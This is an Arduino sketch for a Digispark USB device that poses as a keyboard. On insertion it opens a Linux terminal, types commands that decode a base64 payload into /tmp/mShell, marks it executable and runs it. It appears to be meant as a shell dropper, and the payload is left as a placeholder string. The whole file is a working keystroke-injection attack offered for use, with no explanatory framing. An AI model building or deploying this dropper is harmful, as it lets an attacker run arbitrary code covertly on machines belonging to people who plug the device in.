#include "DigiKeyboard.h"

void setup() {
DigiKeyboard.sendKeyStroke(0); 
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT + MOD_ALT_LEFT);
DigiKeyboard.delay(1000);

DigiKeyboard.print("echo 'GENERATED BASE 64 CODE GOES IN HERE'/+E= | base64 --decode &gt; /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);

DigiKeyboard.println("chmod 755 /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.println("/tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

DigiKeyboard.delay(100);

}

void loop() {
//left deliberately empty
}
